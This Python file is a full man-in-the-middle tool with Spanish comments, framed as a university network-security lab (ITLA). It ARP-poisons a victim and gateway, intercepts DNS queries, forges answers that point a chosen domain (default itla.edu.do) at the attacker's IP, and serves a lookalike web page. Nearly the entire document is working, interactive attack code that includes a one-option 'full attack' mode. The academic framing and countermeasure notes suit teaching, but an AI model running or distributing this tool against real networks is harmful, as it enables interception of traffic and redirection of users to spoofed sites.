#!/usr/bin/env python3
"""
=============================================================
  DNS SPOOFING / POISONING TOOL - Laboratorio Controlado
  Materia: Seguridad de Redes - ITLA
  Técnica: ARP Poisoning → Intercept DNS → Spoof respuesta
  Target : itla.edu.do → IP local (servidor web propio)
  Propósito: Demostración académica. Solo entorno autorizado.
=============================================================
"""

import subprocess, sys, os, time, threading, signal

def install_deps():
    for pkg in ["scapy"]:
        try: __import__(pkg)
        except ImportError:
            print(f"[*] Instalando {pkg}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg], stdout=subprocess.DEVNULL)

install_deps()

from scapy.all import (
    Ether, ARP, IP, UDP, TCP, DNS, DNSQR, DNSRR,
    sendp, send, sniff, get_if_list, get_if_hwaddr,
    conf, srp
)

R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
C="\033[96m"; M="\033[95m"; W="\033[0m"; BLD="\033[1m"

def banner():
    print(f"""
{C}{BLD}
  ██████╗ ███╗  ██╗███████╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗
  ██╔══██╗████╗ ██║██╔════╝    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
  ██║  ██║██╔██╗██║███████╗    ███████╗██████╔╝██║   ██║██║   ██║█████╗
  ██║  ██║██║╚████║╚════██║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝
  ██████╔╝██║ ╚███║███████║    ███████║██║     ╚██████╔╝╚██████╔╝██║
  ╚═════╝ ╚═╝  ╚══╝╚══════╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝
{W}
{Y}  DNS Spoofing + ARP Poisoning → itla.edu.do → Servidor Web Local{W}
{C}  ITLA - Seguridad de Redes | Solo entorno autorizado con contrato firmado{W}
""")

def select_interface():
    ifaces = get_if_list()
    print(f"\n{B}{BLD}[+] Interfaces disponibles:{W}\n")
    for i, iface in enumerate(ifaces):
        print(f"    {Y}[{i}]{W} {iface}")
    print()
    while True:
        try:
            c = int(input(f"{C}[?] Selecciona interfaz (número): {W}"))
            if 0 <= c < len(ifaces):
                sel = ifaces[c]
                print(f"\n{G}[✓] Interfaz: {BLD}{sel}{W}\n")
                return sel
        except (ValueError, KeyboardInterrupt):
            pass
        print(f"{R}[-] Opción inválida.{W}")

def get_mac(ip: str, iface: str) -> str:
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 iface=iface, timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

arp_running = False
arp_thread  = None

def arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface):
    global arp_running
    pkt_to_victim = Ether(dst=victim_mac, src=attacker_mac) / \
                    ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                        psrc=gateway_ip, hwsrc=attacker_mac)
    pkt_to_gw    = Ether(dst=gateway_mac, src=attacker_mac) / \
                    ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                        psrc=victim_ip, hwsrc=attacker_mac)
    print(f"{G}[✓] ARP Poisoning activo. Envío cada 2s...{W}")
    while arp_running:
        sendp(pkt_to_victim, iface=iface, verbose=False)
        sendp(pkt_to_gw,     iface=iface, verbose=False)
        time.sleep(2)

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface):
    print(f"\n{Y}[*] Restaurando tablas ARP...{W}")
    for _ in range(5):
        send(ARP(op=2, pdst=victim_ip,  hwdst=victim_mac,
                 psrc=gateway_ip, hwsrc=gateway_mac), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                 psrc=victim_ip,  hwsrc=victim_mac),  verbose=False)
        time.sleep(0.3)
    print(f"{G}[✓] ARP restaurado.{W}")

spoof_running  = False
dns_thread     = None
spoof_stats    = {"total": 0, "spoofed": 0}

def dns_spoof_handler(pkt, targets, iface):
    global spoof_stats
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0): return
    if not pkt.haslayer(DNSQR): return
    query_name = pkt[DNSQR].qname.decode("utf-8", errors="ignore")
    spoof_stats["total"] += 1
    query_key = query_name if query_name.endswith(".") else query_name + "."
    spoof_ip = None
    for domain, fake_ip in targets.items():
        d = domain if domain.endswith(".") else domain + "."
        if query_key == d or query_key.endswith("." + d):
            spoof_ip = fake_ip
            break
    if not spoof_ip: return
    spoof_stats["spoofed"] += 1
    print(f"    {R}[SPOOFED]{W} {query_name.rstrip('.')} → {spoof_ip}  (de {pkt[IP].src})")
    spoofed_resp = (
        IP(dst=pkt[IP].src, src=pkt[IP].dst)
        / UDP(dport=pkt[UDP].sport, sport=53)
        / DNS(id=pkt[DNS].id, qr=1, aa=1, rd=pkt[DNS].rd, ra=1,
              qd=pkt[DNS].qd,
              an=DNSRR(rrname=pkt[DNSQR].qname, type="A", ttl=300, rdata=spoof_ip))
    )
    send(spoofed_resp, iface=iface, verbose=False)

def start_dns_sniff(targets, iface, victim_ip=None):
    global spoof_running
    bpf = "udp port 53"
    if victim_ip: bpf += f" and host {victim_ip}"
    print(f"\n{G}[✓] Escuchando consultas DNS...{W}")
    print(f"    {C}Filtro: {bpf}{W}")
    print(f"    {C}Dominios objetivo: {list(targets.keys())}{W}\n")
    sniff(iface=iface, filter=bpf,
          prn=lambda pkt: dns_spoof_handler(pkt, targets, iface),
          stop_filter=lambda _: not spoof_running, store=False)

http_thread  = None
http_running = False

def start_web_server(port=80):
    import http.server, socketserver
    html = """<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><title>ITLA - Instituto Tecnológico de las Américas</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f4f4; }
header { background: #003087; color: white; padding: 18px 32px; display: flex; align-items: center; gap: 20px; }
header h1 { font-size: 1.4rem; }
.badge { background: #FF0000; color: white; padding: 4px 12px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; margin-left: auto; }
.hero { background: linear-gradient(135deg, #003087 60%, #0057B8); color: white; text-align: center; padding: 60px 20px; }
.hero h2 { font-size: 2rem; margin-bottom: 12px; }
.warning-bar { background: #FF0000; color: white; text-align: center; padding: 10px; font-weight: bold; }
.cards { display: flex; flex-wrap: wrap; gap: 20px; padding: 40px 32px; justify-content: center; }
.card { background: white; border-radius: 8px; padding: 24px; width: 260px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); border-top: 4px solid #003087; }
footer { background: #003087; color: rgba(255,255,255,0.7); text-align: center; padding: 20px; font-size: 0.8rem; margin-top: 40px; }
</style></head>
<body>
<div class="warning-bar">⚠ PÁGINA DE DEMOSTRACIÓN - DNS SPOOFING LAB - ITLA Seguridad de Redes</div>
<header><div><h1>ITLA</h1><p>Instituto Tecnológico de las Américas</p></div><span class="badge">LAB DEMO</span></header>
<div class="hero"><h2>Bienvenido a ITLA</h2><p>Esta página fue servida por el atacante gracias a DNS Spoofing.</p></div>
<div class="cards">
<div class="card"><h3>¿Qué ocurrió?</h3><p>La consulta DNS para itla.edu.do fue interceptada y respondida con IP falsa.</p></div>
<div class="card"><h3>Vector</h3><p>ARP Poisoning → MITM → DNS Query Intercept → Respuesta falsa TTL 300.</p></div>
<div class="card"><h3>Contramedidas</h3><p>DNSSEC, DNS over HTTPS/TLS, DAI, certificados SSL.</p></div>
</div>
<footer>&copy; 2025 Demo Académica - Seguridad de Redes ITLA</footer>
</body></html>"""
    web_dir = "/tmp/dns_spoof_web"
    os.makedirs(web_dir, exist_ok=True)
    with open(os.path.join(web_dir, "index.html"), "w") as f:
        f.write(html)
    os.chdir(web_dir)
    class SilentHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, fmt, *args):
            print(f"    {M}[HTTP]{W} {self.address_string()} → {args[0]}")
    try:
        with socketserver.TCPServer(("", port), SilentHandler) as httpd:
            print(f"{G}[✓] Servidor web escuchando en puerto {port}{W}")
            while http_running: httpd.handle_request()
    except PermissionError:
        print(f"{R}[-] Puerto {port} requiere root o ya está en uso.{W}")

def enable_ip_forward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1")
        print(f"{G}[✓] IP forwarding habilitado.{W}")
    except Exception as e:
        print(f"{Y}[!] No se pudo habilitar IP forwarding: {e}{W}")

def disable_ip_forward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("0")
        print(f"{Y}[*] IP forwarding deshabilitado.{W}")
    except Exception: pass

def main():
    global arp_running, arp_thread, spoof_running, dns_thread, http_running, http_thread
    if os.geteuid() != 0:
        print(f"{R}[!] Requiere root (sudo).{W}"); sys.exit(1)
    banner()
    print(f"{R}{BLD}  [!] ADVERTENCIA ÉTICA{W}")
    print(f"{Y}  Solo para laboratorio controlado con contrato firmado.{W}\n")
    if input(f"{C}  ¿Confirmas uso ético? (si/no): {W}").strip().lower() not in ("si","sí","s","yes","y"):
        print(f"\n{Y}[!] Saliendo.{W}\n"); sys.exit(0)
    iface = select_interface()
    print(f"{B}{BLD}[+] Configuración del ataque:{W}\n")
    victim_ip    = input(f"    {C}IP de la víctima: {W}").strip()
    gateway_ip   = input(f"    {C}IP del gateway/DNS server (el que quieres interceptar): {W}").strip()
    fake_ip      = input(f"    {C}Tu IP (servidor web falso): {W}").strip()
    domain       = input(f"    {C}Dominio a spoofear [itla.edu.do]: {W}").strip() or "itla.edu.do"
    web_port_str = input(f"    {C}Puerto del servidor web [80]: {W}").strip()
    web_port     = int(web_port_str) if web_port_str.isdigit() else 80
    targets = {domain: fake_ip}
    print(f"\n{Y}[*] Resolviendo MACs via ARP...{W}")
    attacker_mac = get_if_hwaddr(iface)
    victim_mac   = get_mac(victim_ip, iface)
    gateway_mac  = get_mac(gateway_ip, iface)
    if not victim_mac:
        print(f"{R}[-] No se pudo obtener MAC de la víctima. ¿Está activa?{W}"); sys.exit(1)
    if not gateway_mac:
        print(f"{R}[-] No se pudo obtener MAC del gateway/DNS.{W}"); sys.exit(1)
    print(f"    {G}Atacante MAC : {attacker_mac}{W}")
    print(f"    {G}Víctima  MAC : {victim_mac}  ({victim_ip}){W}")
    print(f"    {G}Gateway  MAC : {gateway_mac}  ({gateway_ip}){W}")

    def cleanup(sig=None, frame=None):
        global arp_running, spoof_running, http_running
        print(f"\n{Y}[*] Deteniendo y limpiando...{W}")
        arp_running = spoof_running = http_running = False
        time.sleep(1)
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        disable_ip_forward()
        print(f"{G}[✓] Limpieza completada.{W}\n")
        sys.exit(0)

    signal.signal(signal.SIGINT,  cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    while True:
        print(f"""
{B}{BLD}══════════════════════════════════════════
  MENÚ - DNS Spoofing
  Objetivo : {domain} → {fake_ip}
  Víctima  : {victim_ip}
══════════════════════════════════════════{W}
  {G}[1]{W} Solo DNS Spoofing
  {Y}[2]{W} ARP Poisoning + DNS Spoofing (MITM completo)
  {C}[3]{W} Levantar servidor web (puerto {web_port})
  {M}[4]{W} Ataque completo (ARP + DNS + Web)
  {R}[5]{W} Detener todo y restaurar ARP
  {R}[0]{W} Salir
""")
        opt = input(f"{C}  Opción: {W}").strip()
        if opt == "1":
            if spoof_running: print(f"{Y}[!] Ya activo.{W}"); continue
            enable_ip_forward(); spoof_running = True
            dns_thread = threading.Thread(target=start_dns_sniff, args=(targets, iface, victim_ip), daemon=True)
            dns_thread.start()
        elif opt == "2":
            if arp_running: print(f"{Y}[!] ARP ya activo.{W}"); continue
            enable_ip_forward(); arp_running = True
            arp_thread = threading.Thread(target=arp_poison, args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface), daemon=True)
            arp_thread.start(); time.sleep(1)
            if not spoof_running:
                spoof_running = True
                dns_thread = threading.Thread(target=start_dns_sniff, args=(targets, iface, victim_ip), daemon=True)
                dns_thread.start()
            print(f"\n{G}[✓] ARP Poisoning + DNS Spoofing activos.{W}")
        elif opt == "3":
            if http_running: print(f"{Y}[!] Web ya activo.{W}"); continue
            http_running = True
            http_thread = threading.Thread(target=start_web_server, args=(web_port,), daemon=True)
            http_thread.start(); time.sleep(0.5)
        elif opt == "4":
            enable_ip_forward()
            if not http_running:
                http_running = True
                http_thread = threading.Thread(target=start_web_server, args=(web_port,), daemon=True)
                http_thread.start(); time.sleep(0.5)
            if not arp_running:
                arp_running = True
                arp_thread = threading.Thread(target=arp_poison, args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface), daemon=True)
                arp_thread.start(); time.sleep(1)
            if not spoof_running:
                spoof_running = True
                dns_thread = threading.Thread(target=start_dns_sniff, args=(targets, iface, victim_ip), daemon=True)
                dns_thread.start()
            print(f"{G}[✓] ATAQUE COMPLETO ACTIVO{W}")
        elif opt in ("5", "0"):
            cleanup()
        else:
            print(f"{R}[-] Opción inválida.{W}")
        if spoof_running:
            print(f"{C}    [Stats] Queries: {spoof_stats['total']} | Spoofed: {spoof_stats['spoofed']}{W}")

if __name__ == "__main__":
    main()
